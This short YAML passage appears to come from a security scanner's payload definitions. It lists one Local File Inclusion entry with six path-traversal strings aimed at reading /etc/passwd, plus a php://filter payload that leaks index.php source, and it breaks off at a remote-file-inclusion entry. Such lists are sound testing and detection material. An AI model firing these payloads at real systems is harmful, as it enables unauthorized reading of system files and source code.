  - id: "lfi-001"
    name: "Local File Inclusion"
    category: "file"
    type: "local_file_inclusion"
    severity: "CRITICAL"
    cvss: 8.6
    payloads:
      - "../../../etc/passwd"
      - "....//....//....//etc/passwd"
      - "..%2F..%2F..%2Fetc%2Fpasswd"
      - "....\/....\/....\/etc/passwd"
      - "/var/www/../../etc/passwd"
      - "php://filter/convert.base64-encode/resource=index.php"
  
  - id: "rfi-002"
